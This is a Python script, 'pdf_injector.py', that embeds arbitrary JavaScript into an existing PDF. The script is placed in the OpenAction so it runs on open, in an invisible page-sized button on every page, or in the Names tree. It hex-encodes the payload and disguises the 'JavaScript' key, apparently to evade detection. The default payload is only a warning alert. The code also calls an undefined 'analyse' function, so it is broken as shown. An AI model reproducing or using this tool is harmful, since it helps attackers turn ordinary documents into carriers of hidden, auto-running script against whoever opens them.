import os
import sys

from pdfrw import PdfWriter, PdfReader, PdfName, PdfString, IndirectPdfDict

script = 'app.alert({cMsg: "Something wrong!", cTitle: "WARNING"});'
name = 'ErrorScript'
path = ''
out = 'inj.pdf'
inject_place = 'openaction'


def parser(args):
    # TODO: parse args
    global script
    global name
    global path
    global out
    global inject_place

    if len(args) < 1:
        print("\tUsage:")
        print("\tpdf_injector.py path/to/orig.pdf\n")
        print("\t-n\tScriptName")
        print(f"\t\t\t'{name}' by default")
        print("\t-o\tpath/to/out.pdf")
        print(f"\t\t\t'{out}' by default")
        print("\t-S\tpath/to/script")
        print("\t-s\tsomeJSScript();")
        print(f"\t\t\t'{script}' by default")
        print("\t-i\t[OpenAction | Annots | Names]")
        print(f"\t\t\t'{inject_place}' by default")
        print()
        exit()

    path = args[0]
    if not os.path.exists(path):
        print(f'File {path} does not exist')
        exit()

    # set args
    for i in range(len(args)):
        if args[i] == '-o':
            out = args[i + 1]
        elif args[i] == '-s':
            script = args[i + 1]
        elif args[i] == '-S':
            if not os.path.exists(args[i + 1]):
                print(f'File {args[i + 1]} does not exist')
                exit()
            with open(args[i + 1]) as f:
                script = f.read()
        elif args[i].lower() == 'openaction':
            inject_place = 'openaction'
        elif args[i].lower() == 'names':
            inject_place = 'names'
        elif args[i].lower() == 'annots':
            inject_place = 'annots'

    script = '<' + script.encode().hex() + '>'
    name = '<' + name.encode().hex() + '>'


def add_in_annots(pdf_orig):
    annots = {PdfName.Annots: [{PdfName.Type: PdfName.Annots, PdfName.Subtype: PdfName.Widget,
                                PdfName.Rect: [0, 0, 900, 900],
                                PdfName.Border: [0, 0, 0], PdfName.A:
                                    {PdfName.S: PdfName.JavaScript,
                                     PdfName.JS: PdfString(script)},
                                PdfName.Parent: {PdfName.FT: PdfName.Btn, PdfName.T: PdfString(name)}}]
              }
    for i in range(len(pdf_orig.pages)):
        pdf_orig.pages[i].update(annots)
    return pdf_orig


def add_in_names(pdf_orig):
    names = IndirectPdfDict(**{"J#61vaScript": IndirectPdfDict(
        Names=[PdfString(name), IndirectPdfDict(JS=PdfString(script), S=PdfName('4A617661536372697074'))]
        )})
    pdf_orig.Root.Names = names
    return pdf_orig


def add_in_open_action(pdf_orig):
    open_action = IndirectPdfDict(Type=PdfName.Action, S=PdfName.JavaScript, JS=PdfString(script))
    pdf_orig.Root.OpenAction = open_action
    return pdf_orig


def main(argv):
    parser(argv)
    pdf_orig = PdfReader(path)
    analyse(pdf_orig)

    if inject_place == 'annots':
        pdf_orig = add_in_annots(pdf_orig)
    elif inject_place == 'names':
        pdf_orig = add_in_names(pdf_orig)
    else:
        pdf_orig = add_in_open_action(pdf_orig)

    PdfWriter().write(out, pdf_orig)


if __name__ == '__main__':
    main(sys.argv[1:])
